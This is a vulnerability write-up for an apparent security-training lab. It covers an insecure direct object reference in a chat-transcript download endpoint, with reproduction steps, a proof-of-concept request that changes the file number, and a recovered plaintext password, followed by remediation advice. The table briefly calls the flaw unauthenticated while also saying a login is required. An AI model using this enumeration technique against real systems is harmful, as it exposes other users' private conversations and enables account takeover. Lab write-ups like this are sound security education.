# Vulnerability Report: Account Takeover via Insecure Direct Object Reference in Transcript Download

**Severity:** High  
**CVSS Score:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
**Date:** 2026-07-31  
**Target:** variableSub.web-security-academy.net  

## Executive Summary
An Insecure Direct Object Reference (IDOR) vulnerability was identified in the chat transcript download functionality of the application.
The application stores chat transcripts as sequentially numbered text files (e.g., `1.txt`, `2.txt`) and serves them directly by filename with no access control.
An authenticated attacker can enumerate and download any other user's transcript by simply modifying the filename in the request,
bypassing any ownership or session-based restriction entirely.
In this case, a victim's plaintext password was recovered from their transcript, leading to full account takeover.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | Insecure Direct Object Reference (IDOR) — Unauthenticated File Access |
| Endpoint | `GET /download-transcript/{id}.txt` |
| Method | GET |
| Protection | None — no ownership or session verification on file access |
| Bypass | Changing the numeric filename in the request path to reference another user's transcript |
| Requirement | Any authenticated session on the platform |
| User Interaction | Not required |

## Steps to Reproduce
1. Log in with a valid account and navigate to the live chat page.
2. Send a message and end the chat session — the application will save the transcript server-side.
3. Click "View Transcript" — a GET request is issued to `/download-transcript/2.txt` and the file downloads.
4. Capture that GET request and send it to a replay tool (e.g., Caido Replay or Burp Repeater).
5. Change the filename in the path from `2.txt` to `1.txt`.
6. Send the modified request — observe a `200 OK` response containing another user's full chat transcript.
7. Locate the plaintext password disclosed in the transcript.
8. Log in using the victim's username (`carlos`) and the recovered password — account takeover confirmed.

## Proof of Concept
```http
GET /download-transcript/1.txt HTTP/1.1
Host: variableSub.web-security-academy.net
Cookie: session=<YOUR SESSION>
```

**Response (truncated):**
```
CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
...
You: Ok so my password is ys5fvsgg88vl3ndpkf6f. Is that right?
Hal Pline: Yes it is!
```

## Impact
Any authenticated user can download any other user's chat transcript by guessing or enumerating the sequential file ID.
No victim interaction is required. This can lead to:
- Full account takeover of any user whose transcript contains sensitive information
- Exposure of all chat transcripts on the platform — passwords, personal data, support conversations
- Potential privilege escalation if any targeted account holds an elevated role

## Remediation
- Enforce server-side access control on every transcript request — verify that the requesting session owns the file before serving it
- Do not use sequential or predictable identifiers for sensitive resources — use UUIDs or cryptographically random tokens
- Consider signed, expiring URLs for file downloads to prevent unauthorized direct access
- Sensitive data such as passwords must never be stored or transmitted in plaintext within chat logs
- Conduct a full audit of other file-serving endpoints for similar ownership verification gaps

## References
- OWASP: Broken Access Control (A01:2021)
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-284: Improper Access Control
- PortSwigger: Insecure Direct Object References (IDOR)
